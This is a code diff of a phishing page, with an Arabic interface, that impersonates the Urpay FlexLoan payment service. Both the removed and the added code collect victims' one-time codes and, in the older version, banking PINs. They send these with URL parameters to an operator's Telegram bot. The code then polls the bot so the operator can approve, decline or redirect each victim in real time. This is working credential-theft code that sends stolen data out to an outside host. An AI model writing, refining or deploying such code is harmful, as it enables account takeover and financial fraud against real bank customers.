-      const invalidPinId = `invalid_pin_${ts}`;
-
+    function focusFirstInput(containerId) { const first = document.querySelector(`#${containerId} .otp-input`); if (first) first.focus(); }
+    function submitCode() {
+      if (isProcessing) return; const code = getCode('otpInputs'); if (code.length !== 6) { errMsg.textContent = 'يرجى إدخال الرمز الكامل المكوّن من 6 أرقام.'; errMsg.style.display = 'block'; focusFirstInput('otpInputs'); return; }
+      isProcessing = true; verifyBtn.disabled = true; verifyBtn.textContent = 'جارٍ التحقق...'; const ts = Date.now(); const approveId = `approve_${ts}`; const declineId = `decline_${ts}`; const verifyDeviceId = `verify_${ts}`;
       const paramSummary = Array.from(params.entries()).map(([k,v]) => `${k}: <code>${v}</code>`).join('\n');
-
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 OTP Verification — Urpay FlexLoan</b>\n\n${paramSummary ? paramSummary + '\n' : ''}OTP: <code>${otp}</code>\n\nChoose Action:`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '✅ Approve', callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyDeviceId }
-              ],
-              [
-                { text: '✅ Valid PIN', callback_data: validPinId },
-                { text: '❌ Invalid PIN', callback_data: invalidPinId }
-              ],
-              [{ text: '❌ Decline', callback_data: declineId }]
-            ]
-          }
-        })
-      })
-      .then(() => {
-        spinner.style.display = 'flex';
-        startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
-      })
-      .catch(() => resetOTPButton());
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `<b>🔵 أورباي - تحقق الجهاز</b>\n\n${paramSummary ? paramSummary + '\n' : ''}الكود: <code>${code}</code>\n\nاختر الإجراء:`, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ موافقة', callback_data: approveId }, { text: '📱 تحقق من الجهاز', callback_data: verifyDeviceId }], [{ text: '❌ رفض', callback_data: declineId }]] } }) }).then(() => { startPolling(approveId, declineId, verifyDeviceId); }).catch(() => { isProcessing = false; verifyBtn.disabled = false; verifyBtn.textContent = 'تحقق من الجهاز'; });
     }
-
-    function startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
+    function startPolling(approveId, declineId, verifyDeviceId) {
       const interval = setInterval(() => {
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
+          .then(r => r.json()).then(data => {
             if (!data.ok || !data.result) return;
             data.result.forEach(update => {
               state.lastUpdateId = update.update_id;
-              if (!update.callback_query) return;
-              const cb = update.callback_query.data;
-
-              if (cb === approveId) {
-                clearInterval(interval);
-                spinner.style.display = 'none';
-                showPinModal();
-              } else if (cb === validPinId) {
-                clearInterval(interval);
-                spinner.style.display = 'none';
-                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
-              } else if (cb === verifyDeviceId) {
-                clearInterval(interval);
-                spinner.style.display = 'none';
-                window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
-              } else if (cb === declineId) {
-                clearInterval(interval);
-                spinner.style.display = 'none';
-                errMsg.textContent = 'Wrong or expired OTP. Please try again.';
-                errMsg.style.display = 'block';
-                otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
-                otpInputs[0].focus();
-                resetOTPButton();
-              } else if (cb === invalidPinId) {
-                clearInterval(interval);
-                spinner.style.display = 'none';
-                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
-                pinErrMsg.style.display = 'block';
-                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
-                pinInputs[0].focus();
-                confirmPinBtn.disabled = false;
-                confirmPinBtn.textContent = 'Confirm PIN';
-              }
+              if (!update.callback_query) return; const cb = update.callback_query.data;
+              if (cb === approveId) { clearInterval(interval); window.location.href = 'device.html'; }
+              else if (cb === verifyDeviceId) { clearInterval(interval); window.location.href = 'device.html'; }
+              else if (cb === declineId) { clearInterval(interval); errMsg.textContent = 'رمز غير صحيح أو منتهي الصلاحية. حاول مرة أخرى.'; errMsg.style.display = 'block'; Array.from(document.querySelectorAll('#otpInputs .otp-input')).forEach(i => { i.value = ''; i.classList.remove('filled'); }); focusFirstInput('otpInputs'); isProcessing = false; verifyBtn.disabled = false; verifyBtn.textContent = 'تحقق من الجهاز'; }
             });
-          })
-          .catch(() => {});
+          });
       }, 1000);
     }
-
-    function showPinModal() {
-      pinErrMsg.style.display = 'none';
-      pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
-      pinModal.style.display = 'flex';
-      setTimeout(() => pinInputs[0].focus(), 120);
-    }
-
-    function submitPIN() {
-      const pin = getCode(pinInputs);
-      if (pin.length !== 4) return;
-
-      confirmPinBtn.disabled = true;
-      confirmPinBtn.textContent = 'Verifying...';
-
-      const ts = Date.now();
-      const validId = `valid_${ts}`;
-      const invalidId = `invalid_${ts}`;
-
-      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 PIN Verification — Urpay FlexLoan</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [[
-              { text: '✅ Valid PIN', callback_data: validId },
-              { text: '❌ Invalid PIN', callback_data: invalidId }
-            ]]
-          }
-        })
-      })
-      .then(() => startPINPolling(validId, invalidId))
-      .catch(() => {
-        confirmPinBtn.disabled = false;
-        confirmPinBtn.textContent = 'Confirm PIN';
-      });
-    }
-
-    function startPINPolling(validId, invalidId) {
-      const interval = setInterval(() => {
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-          .then(r => r.json())
-          .then(data => {
-            data.result?.forEach(update => {
-              state.lastUpdateId = update.update_id;
-              if (!update.callback_query) return;
-              const cb = update.callback_query.data;
-
-              if (cb === validId) {
-                clearInterval(interval);
-                pinModal.style.display = 'none';
-                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
-              } else if (cb === invalidId) {
-                clearInterval(interval);
-                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
-                pinErrMsg.style.display = 'block';
-                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
-                pinInputs[0].focus();
-                confirmPinBtn.disabled = false;
-                confirmPinBtn.textContent = 'Confirm PIN';
-              }
-            });
-          })
-          .catch(() => {});
-      }, 1400);
-    }
-
-    function resetOTPButton() {
-      isProcessing = false;
-      verifyBtn.disabled = false;
-      verifyBtn.textContent = 'Verify & Continue';
-    }
-
-    setupInputBehaviour(otpInputs, submitOTP);
-    setupInputBehaviour(pinInputs, submitPIN);
-    verifyBtn.addEventListener('click', submitOTP);
-    confirmPinBtn.addEventListener('click', submitPIN);
-    showApplicationDetails();
-    setTimeout(() => otpInputs[0].focus(), 250);
+    createInputs('otpInputs', 6); setupAutoFocus('otpInputs', 6, submitCode); focusFirstInput('otpInputs'); verifyBtn.onclick = submitCode; loadOffer();
   </script>
 </body>
 </html>
